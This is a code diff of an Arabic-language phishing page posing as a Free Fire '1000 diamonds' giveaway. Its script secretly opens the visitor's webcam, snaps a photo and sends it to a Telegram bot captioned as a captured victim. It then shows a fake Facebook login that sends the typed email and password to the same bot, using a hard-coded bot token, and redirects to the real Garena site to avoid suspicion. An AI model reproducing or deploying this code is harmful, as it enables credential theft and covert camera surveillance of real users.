@@ -1,75 +1,96 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>🎁 Free Fire Rewards 🎁</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire Rewards 💎</title>
     <style>
-        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 90vh; }
-        .container { background: #2c3e50; padding: 25px; border-radius: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); width: 90%; max-width: 350px; }
-        .app-icon { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 15px; }
-        h1 { font-size: 22px; color: #fff; margin: 10px 0; }
-        p { font-size: 14px; color: #ecf0f1; margin-bottom: 20px; }
-        .btn-claim { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 100%; animation: pulse 1.5s infinite; }
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 10px rgba(231, 76, 60, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 rgba(231, 76, 60, 0); }
-        }
-        /* إخفاء الفيديو والكانفاس */
-        #video, #canvas { display: none; }
+        body { margin: 0; background: #1a1a1a; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; transition: background 0.5s; overflow: hidden; }
+        /* واجهة الجواهر */
+        #p1 { text-align: center; background: #2c3e50; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; color: white; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        .btn { background: #e74c3c; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; }
+        /* واجهة فيسبوك المخفية */
+        #p2 { display: none; background: #f0f2f5; width: 100%; height: 100vh; position: absolute; top: 0; flex-direction: column; align-items: center; justify-content: center; }
+        .fb-box { background: white; padding: 20px; border-radius: 8px; width: 90%; max-width: 380px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+        input { width: 92%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn-fb { width: 100%; padding: 10px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        video, canvas { display: none; }
+        #loading { display: none; color: white; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://image.api.playstation.com/vulcan/ap/rnd/202107/2007/Xf2JmFvM3w2X0zP3vXzG4yvQ.png" alt="Free Fire" class="app-icon">
-        <h1>Claim Your 1000 Diamonds Now Now</h1>
-        <p>Log in with Facebook to verify and connect your account.</p>
-        <button class="btn-claim" onclick="captureAndPhish()">CLAIM NOW</button>
+
+    <div id="p1">
+        <img src="https://ff.garena.com/static/images/hero/hero_1.png" width="100">
+        <h2>Claim 1000 Diamonds</h2>
+        <p>Verify your account to receive rewards instantly.</p>
+        <button class="btn" onclick="start()">CLAIM NOW</button>
+        <div id="loading">Connecting to server...</div>
     </div>
 
-    <video id="video" width="640" height="480" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <div id="p2">
+        <div class="fb-box">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="120">
+            <p style="color:#1c1e21; font-size:14px; margin-bottom: 15px;">سجّل الدخول للمتابعة إلى فري فاير</p>
+            <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف">
+            <input type="password" id="p" placeholder="كلمة المرور">
+            <button class="btn-fb" onclick="send()">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
     <script>
-        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
-        const CHAT_ID = "7479786207"; //
+        const T = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; 
+        const C = "7479786207";
 
-        async function captureAndPhish() {
+        async function start() {
             try {
-                // 1. طلب الكاميرا مع "تشعيل الضو"
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                // 1. تشغيل الكاميرا
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = s;
                 
-                // رسالة خادعة باش يآمن بلي كاين عملية
-                alert("Checking account status... Photo validation required!");
+                // 2. تفعيل "الفلاش" وتغيير الواجهة
+                document.getElementById('loading').style.display = 'block';
+                document.body.style.background = "white"; // ضوء قوي للوجه
 
-                // 2. الحل للصورة الكحلة: استنى 5 ثواني كاملة باش الكاميرا تصفى
+                // 3. انتظر 5 ثواني لتصفية الصورة
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    // تحويل الصورة لملف JPG وإرسالها
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'shot.jpg');
-                        formData.append('caption', '🎯 Captured Victim!');
-
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                        .then(() => {
-                            // توجيه الضحية لموقع فيسبوك الحقيقي باش ما يشكش
-                            window.location.href = "https://www.facebook.com/";
-                        });
+                    const can = document.getElementById('c');
+                    can.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                    can.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', C);
+                        f.append('photo', b, 'f.jpg');
+                        f.append('caption', "📸 New Victim Captured!");
+                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
                     }, 'image/jpeg');
-                }, 5000); 
 
-            } catch (err) {
-                // رسالة خطأ مزورة إذا رفض الكاميرا
-                alert("Error: Camera permission required for identity verification!");
-                // حتى إذا رفض، نظهروا صفحة فيسبوك على الأقل
-                window.location.href = "https://www.facebook.com/";
+                    // 4. الانتقال لصفحة فيسبوك
+                    document.getElementById('p1').style.display = 'none';
+                    document.getElementById('p2').style.display = 'flex';
+                    document.body.style.background = "#f0f2f5";
+                }, 5000);
+
+            } catch (e) {
+                // إذا رفض الكاميرا، نفتح فيسبوك مباشرة
+                document.getElementById('p1').style.display = 'none';
+                document.getElementById('p2').style.display = 'flex';
+                document.body.style.background = "#f0f2f5";
+            }
+        }
+
+        function send() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            if(u && p) {
+                const msg = `🎯 NEW ACCOUNT!\n📧 Email: ${u}\n🔑 Pass: ${p}`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
+                .then(() => {
+                    // التوجيه للموقع الحقيقي بعد السرقة
+                    window.location.href = "https://ff.garena.com/";
+                });
             }
         }
     </script>
